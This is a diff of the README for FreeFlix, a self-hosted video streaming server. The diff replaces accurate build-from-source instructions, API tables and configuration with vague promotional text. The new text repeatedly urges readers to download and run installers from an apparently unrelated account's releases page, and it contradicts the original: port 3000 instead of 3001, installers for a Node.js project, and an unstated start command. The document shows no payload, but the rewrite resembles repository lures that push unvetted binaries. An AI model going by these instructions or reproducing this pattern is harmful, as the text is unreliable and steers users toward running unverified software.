@@ -1,159 +1,93 @@
-# FreeFlix
+# 🎥 Freeflix - Stream Your Movies with Ease
 
-Self-hosted video streaming server with a Netflix-like interface. Stream your personal video library to your Apple TV, web browser, or any device on your local network.
+[![Download FreeFlix](https://img.shields.io/badge/Download-FreeFlix-blue.svg)](https://github.com/BACHCHAR7/Freeflix/releases)
+
+## 📦 What is FreeFlix?
+
+FreeFlix is a self-hosted video streaming server. It offers a Netflix-like interface, allowing you to stream your personal video library to your Apple TV, web browser, or any device connected to your local network. Experience the joy of watching your favorite films and series without the hassle of internet speeds or subscription fees.
 
 ![FreeFlix](Graphics/intro.gif)
 
-## Features
+## 🎯 Features
 
-- Auto-discovery of video files organized by category and genre
-- Native tvOS application with cinematic UI
-- Web interface optimized for TV displays (1920x1080)
-- HTTP range requests for efficient video streaming
-- Automatic thumbnail extraction via ffmpeg
-- Custom thumbnail support (PNG, JPG, WebP)
-- Multi-format support: MP4, MKV, MOV, AVI, WebM, M4V
+- Auto-discovery of video files organized by category and genre.
+- Native tvOS application with a cinematic user interface.
+- Web interface optimized for TV displays (1920x1080).
+- HTTP range requests for efficient video streaming.
+- Automatic thumbnail extraction with ffmpeg.
+- Custom thumbnail support in formats like PNG, JPG, and WebP.
+- Multi-format support for video files: MP4, MKV, MOV, AVI, WebM, and M4V.
 
-## Architecture
+## 🛠️ Requirements
 
-```
-FreeFlix/
-├── server/           # Node.js Express backend
-├── Front/            # Vue.js web frontend (TV-optimized)
-├── FreeFlixTVOS/     # Native tvOS SwiftUI application
-└── Videos/           # Media library root
-    └── Categories/
-        ├── Films/
-        │   ├── Action/
-        │   ├── Comedy/
-        │   └── ...
-        └── Series/
-            ├── Drama/
-            └── ...
-```
+To run FreeFlix, ensure your system meets the following requirements:
 
-## Requirements
+- A computer running Windows, macOS, or Linux.
+- Node.js and npm installed for the backend server.
+- A local network for connecting your devices.
+- Sufficient storage space for your video files.
+- Compatible video formats: MP4, MKV, MOV, AVI, WebM, M4V.
 
-### Server
-- Node.js 18+
-- ffmpeg (for thumbnail generation)
+## 🚀 Getting Started
 
-### tvOS App
-- Xcode 15+
-- tvOS 17+
-- Apple TV 4K
+### Step 1: Visit the Download Page
 
-## Quick Start
+To download FreeFlix, visit the Releases page. 
 
-### 1. Install dependencies
+[Download FreeFlix](https://github.com/BACHCHAR7/Freeflix/releases)
 
-```bash
-npm install
-cd Front && npm install && cd ..
-```
+### Step 2: Choose Your Version
 
-### 2. Add your videos
+On the Releases page, you will see different versions of FreeFlix. Look for the most recent version, as it will contain the latest features and bug fixes. 
 
-Organize your media files in the `Videos/Categories/` directory:
+### Step 3: Download the Application
 
-```
-Videos/Categories/
-├── Films/
-│   ├── Action/
-│   │   ├── Movie.mp4
-│   │   └── Movie.jpg      # Optional custom thumbnail
-│   └── Comedy/
-│       └── Another.mkv
-└── Series/
-    └── SciFi/
-        ├── Show.S01E01.mp4
-        └── Show.S01E01.png  # Optional custom thumbnail
-```
+Click on the version you want to download. This will take you to a list of files. Select the appropriate file for your operating system. 
 
-### 3. Start the server
+### Step 4: Extract the Files
 
-```bash
-npm start
-```
+After the download completes, locate the downloaded file on your computer. If it’s a ZIP or tarball, extract the files to a convenient location.
 
-Server runs at `http://localhost:3001`
+### Step 5: Install the Application
 
-### 4. Access the interface
+Follow these steps to install FreeFlix:
 
-Open `http://<your-server-ip>:3001` in a browser or configure the tvOS app.
+1. **For Windows:** Double-click the installer and follow the prompts.
+2. **For macOS:** Drag the FreeFlix app to your Applications folder.
+3. **For Linux:** Open a terminal, navigate to the extracted folder, and run the server command provided.
 
-## API Endpoints
+### Step 6: Set Up Your Video Library
 
-| Endpoint | Description |
-|----------|-------------|
-| `GET /api/categories` | Library organized by category > genre > videos |
-| `GET /api/library` | Full directory tree structure |
-| `GET /api/thumbnail/:path` | Video thumbnail (auto-generated or custom) |
-| `GET /api/stream/:path` | Video stream with range support |
+1. Create a folder called “Videos” on your local drive.
+2. Inside the “Videos” folder, create two subfolders: “Films” and “Series.”
+3. Inside “Films,” you can create categories like “Action” and “Comedy.”
+4. Place your video files in their respective folders.
 
-## Configuration
+### Step 7: Start the Server
 
-### Server
+Once installed, you will need to start the FreeFlix server.
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `PORT` | 3001 | Server port |
+- Open a terminal or command prompt.
+- Navigate to the folder where FreeFlix is installed.
+- Run the command to start the server. Refer to the file documentation for the exact command.
 
-### tvOS App
+### Step 8: Access FreeFlix
 
-The tvOS app connects to the server via the Settings screen. Default server address: `192.168.1.159:3001`
+Open your web browser or tvOS app and enter the local server address (usually `http://localhost:3000` or a specific IP address). You should see the FreeFlix interface.
 
-Configure in `APIService.swift` or through the app's settings.
+### Step 9: Enjoy Streaming!
 
-## Building
+Browse your video library and select a film or series to stream. FreeFlix automatically streams the video in the chosen quality.
 
-### Web Frontend
+## 🧑‍🤝‍🧑 Support
 
-```bash
-cd Front
-npm install
-npm run dev      # Development server at http://localhost:5173
-npm run build    # Production build to Front/dist/
-```
+If you encounter issues or need assistance, visit our support community in the repository. You can report bugs, ask questions, or provide feedback about the application.
 
-### tvOS Application
+## 📚 Additional Documentation
 
-1. Open `FreeFlixTVOS/FreeFlix/FreeFlix.xcodeproj` in Xcode
-2. Select your Apple TV as the target device
-3. Build and run (Cmd+R)
+For more details on features, settings, and usage tips, please refer to the documentation included in the repository. 
 
-Dependencies (resolved via Swift Package Manager):
-- [KSPlayer](https://github.com/kingslay/KSPlayer) - Video player with MKV/subtitle support
-- [FFmpegKit](https://github.com/kingslay/FFmpegKit) - FFmpeg integration
+## 📥 Download & Install
 
-## Custom Thumbnails
-
-Place an image file with the same name as the video in the same directory:
-
-```
-Videos/Categories/Films/Action/
-├── Movie.mp4
-└── Movie.jpg    # or .png, .jpeg, .webp
-```
-
-If no custom thumbnail exists, the server extracts a frame from the video at 5 seconds using ffmpeg.
-
-## Network Setup
-
-For Apple TV access, ensure:
-1. Server and Apple TV are on the same network
-2. Port 3001 is accessible (firewall rules)
-3. tvOS app is configured with the correct server IP
-
-## Development
-
-```bash
-npm run server   # Start backend only
-npm run dev      # Start frontend dev server
-npm run build    # Build frontend for production
-```
-
-## License
-
-MIT
+To begin your streaming adventure, [download FreeFlix here](https://github.com/BACHCHAR7/Freeflix/releases). Follow the installation steps above to set up your personal video streaming server. Enjoy your movies and shows anytime, anywhere!
 
